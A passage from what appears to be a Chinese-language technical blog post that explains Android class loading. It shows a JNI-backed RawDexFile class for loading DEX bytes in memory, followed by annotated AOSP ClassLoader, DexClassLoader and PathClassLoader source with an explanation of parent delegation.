<span class="hljs-title class_">RawDexFile</span> &#123;  <span class="hljs-comment">//定义了一个公开的类RawDexFile</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mCookie;<br>    <span class="hljs-keyword">private</span> String mDexName;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">RawDexFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span> &#123;<br>        mCookie = openRawDexFile(rawDex, dexName, <span class="hljs-number">0</span>);<br>        mDexName = dexName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">loadClass</span><span class="hljs-params">(String name, ClassLoader loader)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">slashName</span> <span class="hljs-operator">=</span> name.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>        <span class="hljs-keyword">return</span> loadClassBinaryName(slashName, loader);<br>    &#125;<br><br>  <span class="hljs-comment">//  调用loadClassBinaryName方法并返回结果。</span><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">loadClassBinaryName</span><span class="hljs-params">(String name, ClassLoader loader)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(name, loader, mCookie);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">public</span> RawDexFile <span class="hljs-title function_">loadDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawDexFile</span>(rawDex, dexName, flags);<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(String name, ClassLoader loader, <span class="hljs-type">long</span> cookie)</span> &#123;  <span class="hljs-comment">//定义类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            result = defineClassNative(name, loader, cookie);   <span class="hljs-comment">//尝试调用本地方法defineClassNative来定义类，并捕获异常。</span><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoClassDefFoundError e) &#123;<br>            <span class="hljs-comment">// TODO Auto-generated catch block</span><br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        closeDexFile(mCookie);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String[] getLoadedClassName()<br>    &#123;<br>        <span class="hljs-keyword">return</span> getClassNameList(mCookie);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;egis&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">//因为有几个本地方法（native methods）的声明。本地方法是用native关键字标识的，表示它们不是用Java实现的，而是用其他语言（通常是C或C++）实现的，并通过JNI与Java代码交互。在RawDexFile类中，如openRawDexFile、closeDexFile、defineClassNative和getClassNameList方法都是本地方法。</span><br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-type">long</span> <span class="hljs-title function_">openRawDexFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span>;  <span class="hljs-comment">//声明本地方法openRawDexFile。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">closeDexFile</span><span class="hljs-params">(<span class="hljs-type">long</span> cookie)</span>;  <span class="hljs-comment">//公开方法close，用于关闭DEX文件。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClassNative(String name, ClassLoader loader, <span class="hljs-type">long</span> cookie)<br>            <span class="hljs-keyword">throws</span> ClassNotFoundException, NoClassDefFoundError;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String[] getClassNameList(<span class="hljs-type">long</span> cookie);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>RawDexClassLoader&#x2F;src&#x2F;com&#x2F;payegis&#x2F;<strong>RawDexFile.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.payegis;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RawDexFile</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mCookie; <span class="hljs-comment">//用于存储打开DEX文件时返回的句柄或标识符。</span><br>    <span class="hljs-keyword">private</span> String mDexName; <span class="hljs-comment">//存储DEX文件的名称。</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">RawDexFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span> &#123;<br>        mCookie = openRawDexFile(rawDex, dexName, <span class="hljs-number">0</span>);  <span class="hljs-comment">//用openRawDexFile本地方法打开DEX文件，并保存返回的句柄（mCookie）和DEX文件名。</span><br>        mDexName = dexName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">loadClass</span><span class="hljs-params">(String name, ClassLoader loader)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">slashName</span> <span class="hljs-operator">=</span> name.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);  <span class="hljs-comment">//将全限定名中的点（.）替换为斜杠（/）  如果有一个类名为MainActivity，并且这个类位于com.example.myapp包中，那么这个类的全限定名就是com.example.myapp.MainActivity。</span><br>        <span class="hljs-keyword">return</span> loadClassBinaryName(slashName, loader);<br>    &#125;<br><br>    <span class="hljs-comment">// 加载一个类名形如com/hello/world的类  </span><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">loadClassBinaryName</span><span class="hljs-params">(String name, ClassLoader loader)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(name, loader, mCookie);  <span class="hljs-comment">//通过defineClass方法加载并返回类</span><br>    &#125;<br><br>    <span class="hljs-comment">//用于创建RawDexFile实例。这是外部代码使用这个类的主要入口点。</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">public</span> RawDexFile <span class="hljs-title function_">loadDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawDexFile</span>(rawDex, dexName, flags);<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(String name, ClassLoader loader, <span class="hljs-type">long</span> cookie)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            result = defineClassNative(name, loader, cookie);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoClassDefFoundError e) &#123;<br>            <span class="hljs-comment">// TODO Auto-generated catch block</span><br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        closeDexFile(mCookie);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String[] getLoadedClassName()<br>    &#123;<br>        <span class="hljs-keyword">return</span> getClassNameList(mCookie); <span class="hljs-comment">//返回一个字符串数组，包含通过这个RawDexFile实例加载的所有类的名称。</span><br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;egis&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-type">long</span> <span class="hljs-title function_">openRawDexFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, <span class="hljs-type">int</span> flags)</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">closeDexFile</span><span class="hljs-params">(<span class="hljs-type">long</span> cookie)</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClassNative(String name, ClassLoader loader, <span class="hljs-type">long</span> cookie)<br>            <span class="hljs-keyword">throws</span> ClassNotFoundException, NoClassDefFoundError;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String[] getClassNameList(<span class="hljs-type">long</span> cookie);<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h5 id="android-ClassLoader"><a href="#android-ClassLoader" class="headerlink" title="android-ClassLoader"></a>android-ClassLoader</h5><p>Android和java中的ClassLoader可以说不是同一个东西，java中可执行文件为class，而android为dex</p><p>Android中的classloader</p><ul><li>系统类加载器：BootClassLoader、PathClassLoader、DexClassLoader。</li><li>自定义加载器：即继承自系统的类加载器。</li></ul><h6 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> ClassLoader parent;  <span class="hljs-comment">//记录父类加载器</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Void <span class="hljs-title function_">checkCreateClassLoader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ClassLoader</span><span class="hljs-params">(Void unused, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.parent = parent;<br>    &#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">ClassLoader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>(checkCreateClassLoader(), getSystemClassLoader());<br>    &#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">ClassLoader</span><span class="hljs-params">(ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">this</span>(checkCreateClassLoader(), parent);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>ClassLoader是一个抽象类，在构造方法中调用了<code>getSystemClassLoader()</code>方法，获取SystemClassLoader，它的代码同样在ClassLoader类中，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SystemClassLoader</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> ClassLoader.createSystemClassLoader();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ClassLoader <span class="hljs-title function_">getSystemClassLoader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> SystemClassLoader.loader;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ClassLoader <span class="hljs-title function_">createSystemClassLoader</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">librarySearchPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PathClassLoader</span>(classPath, librarySearchPath, BootClassLoader.getInstance());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见SystemClassLoader对应的是PathClassLoader。</p><p>从ClassLoader的代码中可以看出，每创建一个ClassLoader实例，都需要一个现有的ClassLoader实例作为新创建的实例的Parent，这样一来，所有的ClassLoader之间的关联就像一棵树一样，这也是ClassLoader的 双亲代理模型的特点。</p><h6 id="BootClassLoader"><a href="#BootClassLoader" class="headerlink" title="BootClassLoader"></a><strong>BootClassLoader</strong></h6><p>Android系统启动时会使用BootClassLoader来预加载常用类，它由Java实现，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BootClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> BootClassLoader instance;<br><br>    <span class="hljs-meta">@FindBugsSuppressWarnings(&quot;DP_CREATE_CLASSLOADER_INSIDE_DO_PRIVILEGED&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> BootClassLoader <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BootClassLoader</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BootClassLoader是ClassLoader的内部类，并继承自ClassLoader。由于BootClassLoader的权限声明是默认的，只有在同一包中才能访问，因此我们在应用程序中是无法直接调用的。</p><h6 id="BaseDexClassLoader"><a href="#BaseDexClassLoader" class="headerlink" title="BaseDexClassLoader"></a><strong>BaseDexClassLoader</strong></h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseDexClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DexPathList pathList;  <span class="hljs-comment">//记录dex文件路径信息</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BaseDexClassLoader</span><span class="hljs-params">(String dexPath, File optimizedDirectory, String libraryPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        <span class="hljs-built_in">this</span>.pathList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexPathList</span>(<span class="hljs-built_in">this</span>, dexPath, libraryPath, optimizedDirectory);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BaseDexClassLoader继承自ClassLoader，在构造方法中初始化了DexPathList对象，这个对象比较关键，后续会讲解到。</p><h6 id="DexClassLoader"><a href="#DexClassLoader" class="headerlink" title="DexClassLoader"></a><strong>DexClassLoader</strong></h6><p>DexClassLoader是用来加载dex文件以及包含dex文件的压缩包（apk、jar）。它的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DexClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseDexClassLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DexClassLoader</span><span class="hljs-params">(String dexPath, String optimizedDirectory,</span><br><span class="hljs-params">            String librarySearchPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(dexPath, <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(optimizedDirectory), librarySearchPath, parent);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参数解析如下：</p><ul><li><code>dexPath</code>：dex文件或包含dex文件的jar&#x2F;apk文件的路径集合，多个路径用文件分隔符分隔，默认文件分隔符为”:”。</li><li><code>optimizedDirectory</code>：dex优化后产生的文件所存放的路径。</li><li><code>librarySearchPath</code>：native库的路径集合，多个路径用文件分隔符分隔。</li><li><code>parent</code>：父加载器</li></ul><p>DexClassLoader继承自BaseDexClassLoader，它的方法均在BaseDexClassLoader中实现。DexClassLoader通常用来加载已安装的jar、apk、dex以及SD卡中加载未安装的apk。</p><h6 id="PathClassLoader"><a href="#PathClassLoader" class="headerlink" title="PathClassLoader"></a><strong>PathClassLoader</strong></h6><p>Android系统使用PathClassLoader来加载系统类和应用程序的类，它的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/PathClassLoader.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PathClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseDexClassLoader</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PathClassLoader</span><span class="hljs-params">(String dexPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(dexPath, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, parent);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PathClassLoader</span><span class="hljs-params">(String dexPath, String librarySearchPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(dexPath, <span class="hljs-literal">null</span>, librarySearchPath, parent);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同DexClassLoader一样，PathClassLoader继承自BaseDexClassLoader，方法也都在父类中实现。</p><p>可以注意到，PathClassLoader的构造方法中都没有optimizedDirectory参数，这是因为PathClassLoader中默认optimizedDirectory的值为<code>/data/dalvik-cache</code>（是的，默认dex优化文件的存放目录），因此PathClassLoader是用来加载系统中已经安装过的apk的dex文件。</p><p>ClassLoader的继承关系</p><ul><li>ClassLoader：抽象类，定义了classloader的主要功能。</li><li>BootClassLoader：classloader的内部类，并继承自classloader。</li><li>SecureClassLoader：继承自ClassLoader，拓展了ClassLoader类的权限方面的功能。</li><li>URLClassLoader：继承来自SecureClassLoader，用来通过URL路劲从jar文件和文件夹加载类和资源。</li><li>BaseDexClassLoader：继承ClassLoader，是抽象类ClassLoader的具体实现类。</li><li>InMemoryDexClassLoader：Android8新增的类加载器，继承来自BaseDexClassLoader，用于加载内存中的dex文件。</li><li>PathClassLoader：继承BaseDexClassLoader，用于加载已安装的jar、apk、dex以及SD卡中加载未安装的apk。</li></ul><p>父类加载器和子类加载器之间并不是继承关系，而是使用组合关系赖调用父类加载器，即创建类加载器时传入的parent参数</p><p>对应ClassLoader中的核心代码<code>loadClass()</code>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-type">boolean</span> resolve)<br>    <span class="hljs-keyword">throws</span> ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// 先检查是否已经加载过了该类</span><br>    Class&lt;?&gt; c = findLoadedClass(name);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (parent != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//没有加载该类，且存在父加载器，交给父加载器处理</span><br>                c = parent.loadClass(name, <span class="hljs-literal">false</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//没有加载该类，且不存在父加载器</span><br>                c = findBootstrapClassOrNull(name);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            <span class="hljs-comment">// ClassNotFoundException thrown if class not found</span><br>            <span class="hljs-comment">// from the non-null parent class loader</span><br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//父加载器处理失败，自己来找</span><br>            c = findClass(name);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-keyword">private</span> Class&lt;?&gt; findBootstrapClassOrNull(String name)<br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ClassLoader加载类的过程</p><p>ClassLoader加载类的方法为loadClass(),他被定义在抽象类ClassLoader中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-type">boolean</span> resolve)<br>    <span class="hljs-keyword">throws</span> ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// 先检查是否已经加载过了该类</span><br>    Class&lt;?&gt; c = findLoadedClass(name);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (parent != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//没有加载该类，且存在父加载器，交给父加载器处理</span><br>                c = parent.loadClass(name, <span class="hljs-literal">false</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//没有加载该类，且不存在父加载器</span><br>                c = findBootstrapClassOrNull(name);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            <span class="hljs-comment">// ClassNotFoundException thrown if class not found</span><br>            <span class="hljs-comment">// from the non-null parent class loader</span><br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//父加载器处理失败，自己来找</span><br>            c = findClass(name);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-keyword">private</span> Class&lt;?&gt; findBootstrapClassOrNull(String name)<br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用findLoadClass()方法查看本身有没有加载过该类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;<br>    ClassLoader loader;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == BootClassLoader.getInstance())<br>        loader = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">else</span><br>        loader = <span class="hljs-built_in">this</span>;<br>    <span class="hljs-keyword">return</span> VMClassLoader.findLoadedClass(loader, name);<br>&#125;<br></code></pre></td></tr></table></figure><p>继而调用VMclassLoader的findLoaledClass()方法（这个方法需要在native层实现。）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/libart/src/main/java/java/lang/VMClassLoader.java</span><br><span class="hljs-keyword">native</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">findLoadedClass</span><span class="hljs-params">(ClassLoader cl, String name)</span>;<br></code></pre></td></tr></table></figure><p>findClass()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 